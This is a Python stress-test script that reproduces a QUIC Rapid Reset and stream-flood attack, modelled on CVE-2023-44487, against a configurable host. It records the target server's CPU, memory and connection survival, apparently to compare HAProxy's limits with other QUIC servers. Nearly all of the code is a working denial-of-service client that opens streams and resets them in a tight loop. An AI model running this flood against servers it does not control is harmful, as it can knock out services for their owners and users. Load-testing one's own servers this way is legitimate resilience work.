#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2000-2026 Willy Tarreau and HAProxy contributors. See LICENSE.

"""QUIC Rapid Reset and Stream Flood Duress Test Script.

The QUIC analogue of HTTP/2 Rapid Reset (CVE-2023-44487):
- Rapidly opens bidirectional streams and immediately sends RESET_STREAM and STOP_SENDING frames.
- Tests server resilience against stream ID exhaustion and state allocation duress.
- Measures server CPU ticks, RSS memory delta, error codes emitted, and connection survival.
- Compares HAProxy (tune.quic.fe.stream.max-total, tune.quic.fe.sec.glitches-threshold) vs Ibex / quinn-proto.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import ssl
import sys
import time
from typing import Dict, List, Optional, Tuple

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3Connection, ErrorCode
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ConnectionTerminated, StreamReset


def get_process_metrics(pid: int) -> Tuple[float, int]:
    """Return (cpu_ticks, rss_kb) for a given PID."""
    try:
        with open(f"/proc/{pid}/stat", "r") as f:
            parts = f.read().split()
            utime = int(parts[13])
            stime = int(parts[14])
        with open(f"/proc/{pid}/status", "r") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    rss_kb = int(line.split()[1])
                    return float(utime + stime), rss_kb
    except Exception:
        pass
    return 0.0, 0


class RapidResetClient(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.h3: Optional[H3Connection] = None
        self.connection_closed = False
        self.close_error_code: Optional[int] = None
        self.close_reason = ""

    def quic_event_received(self, event):
        if isinstance(event, ConnectionTerminated):
            self.connection_closed = True
            self.close_error_code = event.error_code
            self.close_reason = event.reason_phrase
        if self.h3 is not None:
            for _ in self.h3.handle_event(event):
                pass


async def run_stream_flood_test(
    host: str,
    port: int,
    total_resets: int = 1000,
    target_pid: Optional[int] = None,
    max_duration: float = 10.0,
) -> Dict:
    config = QuicConfiguration(
        is_client=True,
        alpn_protocols=["h3"],
        verify_mode=ssl.CERT_NONE,
        max_datagram_frame_size=65536,
    )

    initial_cpu, initial_rss = get_process_metrics(target_pid) if target_pid else (0.0, 0)
    start_time = time.time()
    resets_sent = 0
    conn_survived = False
    close_code = None
    close_reason = ""

    try:
        async with connect(
            host, port,
            configuration=config,
            create_protocol=RapidResetClient,
            wait_connected=True,
        ) as client:
            client.h3 = H3Connection(client._quic)

            while resets_sent < total_resets and not client.connection_closed and (time.time() - start_time) < max_duration:
                try:
                    stream_id = client._quic.get_next_available_stream_id()
                    # Send HEADERS
                    client.h3.send_headers(
                        stream_id=stream_id,
                        headers=[
                            (b":method", b"GET"),
                            (b":scheme", b"https"),
                            (b":authority", f"{host}:{port}".encode()),
                            (b":path", f"/stream-flood-{resets_sent}".encode()),
                        ],
                        end_stream=False,
                    )
                    # Immediately RESET_STREAM and STOP_SENDING
                    client._quic.reset_stream(stream_id, error_code=ErrorCode.H3_REQUEST_CANCELLED.value)
                    client._quic.stop_stream(stream_id, error_code=ErrorCode.H3_REQUEST_CANCELLED.value)
                    resets_sent += 1
                except (ValueError, KeyError):
                    # Stream limits reached; transmit and yield to receive MAX_STREAMS update from peer
                    client.transmit()
                    await asyncio.sleep(0.002)

                if resets_sent % 32 == 0:
                    client.transmit()
                    await asyncio.sleep(0.001)

            client.transmit()
            await asyncio.sleep(0.2)

            conn_survived = not client.connection_closed
            close_code = client.close_error_code
            close_reason = client.close_reason
    except Exception as e:
        close_reason = str(e)

    elapsed = time.time() - start_time
    final_cpu, final_rss = get_process_metrics(target_pid) if target_pid else (0.0, 0)
    rss_delta_kb = final_rss - initial_rss if target_pid else 0

    return {
        "target": f"{host}:{port}",
        "target_resets": total_resets,
        "resets_sent": resets_sent,
        "elapsed_sec": elapsed,
        "resets_per_sec": resets_sent / elapsed if elapsed > 0 else 0,
        "connection_survived": conn_survived,
        "close_error_code": close_code,
        "close_reason": close_reason,
        "initial_rss_kb": initial_rss,
        "final_rss_kb": final_rss,
        "rss_delta_kb": rss_delta_kb,
    }


def print_report(server_name: str, res: Dict):
    print(f"===========================================================")
    print(f" QUIC Stream Flood / Rapid Reset Test: {server_name} ({res['target']})")
    print(f"===========================================================")
    print(f"[*] Resets Completed:   {res['resets_sent']} / {res['target_resets']}")
    print(f"[*] Elapsed Time:       {res['elapsed_sec']:.3f} s ({res['resets_per_sec']:.1f} resets/s)")
    print(f"[*] Conn Survived:      {res['connection_survived']}")
    if not res['connection_survived']:
        print(f"[*] Close Error Code:   {res['close_error_code']} ({res['close_reason']})")
    if res['final_rss_kb'] > 0:
        print(f"[*] Memory RSS:         {res['final_rss_kb']} KB (delta: {res['rss_delta_kb']:+d} KB)")
    print()


def main():
    parser = argparse.ArgumentParser(description="QUIC Stream Flood / Rapid Reset Test")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, required=True, help="Target QUIC port")
    parser.add_argument("--pid", type=int, default=None, help="Target process PID")
    parser.add_argument("--resets", type=int, default=1000, help="Number of stream resets to issue")
    parser.add_argument("--name", default="Server", help="Server name label")
    parser.add_argument("--json", action="store_true", help="Output JSON results")
    args = parser.parse_args()

    res = asyncio.run(run_stream_flood_test(args.host, args.port, total_resets=args.resets, target_pid=args.pid))
    if args.json:
        print(json.dumps(res, indent=2))
    else:
        print_report(args.name, res)


if __name__ == "__main__":
    main()
